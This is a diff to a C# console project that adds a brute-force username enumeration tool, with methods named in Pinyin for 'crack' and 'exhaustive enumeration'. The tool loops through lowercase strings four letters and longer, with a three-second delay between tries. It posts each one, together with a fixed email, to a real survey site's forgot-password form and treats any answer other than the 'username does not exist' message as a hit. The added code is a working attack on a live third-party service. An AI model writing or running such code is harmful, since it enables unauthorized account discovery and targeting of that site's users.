@@ -9,6 +9,7 @@ using System.Linq;
 using System.Net;
 using System.Text;
 using System.Threading.Tasks;
+using System.Web;
 
 namespace ConsoleClient
 {
@@ -20,7 +21,9 @@ namespace ConsoleClient
             //GetSomePassword();            
             //TestNetHelperPost();
             //string content = NetHelper.Get("http://www.baidu.com");
-            TestApiInvoker();
+            //TestApiInvoker();
+            //PoJie();
+            QiongJu();
             //GetAccessConfigData();
             //TestCache();
             Console.ReadKey();
@@ -34,13 +37,13 @@ namespace ConsoleClient
 
             }
 
-            var response2 = AppNetHelper.Post<User>("http://localhost:8091/api/user/Add", 
+            var response2 = AppNetHelper.Post<User>("http://localhost:8091/api/user/Add",
                 new User { UserCode = "tester", UserName = "testerName" });
-            if(response2.Status == 200)
+            if (response2.Status == 200)
             {
                 var user = response2.Data;
             }
-        }       
+        }
 
         private static void TestNetHelper()
         {
@@ -89,6 +92,94 @@ namespace ConsoleClient
             using (StreamReader sr = new StreamReader(stream, Encoding.UTF8))
             {
                 var content = sr.ReadToEnd();
+            }
+        }
+
+        private static bool PoJie(string str)
+        {
+            if (SendRequest(str, "admin@163.com"))
+            {
+                Console.WriteLine(string.Format("{0},{1} - success", str, "admin@163.com"));
+                return true;
+            }
+            else
+            {
+                Console.WriteLine(string.Format("{0},{1} - fail", str, "admin@163.com"));
+                return false;
+            }
+
+        }
+
+        private static string QiongJu()
+        {
+            string baseTest = "abcdefghljklmnopqrstuvwxyz";
+
+            //Loop(baseTest, new char[1], 0);
+            for (int i = 4; i <= baseTest.Length; i++)
+            {
+                if (Flag)
+                    break;
+                Loop(baseTest, new char[i], 0);
+            }
+
+
+
+            return "";
+
+        }
+
+        private static int CountNumber = 0;
+        private static bool Flag = false;
+        private static void Loop(string baseTest, char[] charArr, int charCurrentIndex)
+        {
+            for (int j = 0; j < baseTest.Length; j++)
+            {
+                if (Flag)
+                    break;
+
+                charArr[charCurrentIndex] = baseTest[j];
+                if (charCurrentIndex + 1 == charArr.Length)
+                {
+                    string s = new string(charArr);
+                    Console.WriteLine(s);
+                    if (string.Compare(s, "aeoe") > -1)
+                    {
+                        CountNumber++;
+                        System.Threading.Thread.Sleep(new TimeSpan(0, 0, 3));
+                        if (PoJie(s))
+                            Flag = true;
+                    }
+                }
+                else
+                {
+                    Loop(baseTest, charArr, charCurrentIndex + 1);
+                }
+            }
+        }
+
+        private static bool SendRequest(string userName, string email)
+        {
+            string url = "https://www.sojump.hk/wjx/user/forgetpassword.aspx";
+            HttpWebRequest request = HttpWebRequest.Create(url) as HttpWebRequest;
+
+            email = HttpUtility.UrlEncode(email);
+
+            request.Method = "Post";
+            request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
+            string body = "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTEzNTQ0MTk3MTlkZHV2lLgYESMUrnglPm18EFZQ5Kv%2B&__EVENTVALIDATION=%2FwEdAATGkB4Yf3xe7KIXHQEVxh2YR1LBKX1P1xh290RQyTesRUMHZh9ZuPBRie2vA%2FHfoRIP%2FjKiv%2FYmGeAMMRSo4HL3MLrwCuxhcRuNaKl0ZTARIHX7TSw%3D&UserName=" + userName + "&txtEmail=" + email + "&SubmitButton=%E4%B8%8B%E4%B8%80%E6%AD%A5";
+
+            byte[] bytes = Encoding.UTF8.GetBytes(body);
+            request.GetRequestStream().Write(bytes, 0, bytes.Length);
+
+            WebResponse response = request.GetResponse();
+            var stream = response.GetResponseStream();
+            using (StreamReader sr = new StreamReader(stream, Encoding.UTF8))
+            {
+                var content = sr.ReadToEnd();
+                if (content.Contains("用户名不存在，请重新输入！"))
+                    return false;
+                else
+                    return true;
             }
         }
 
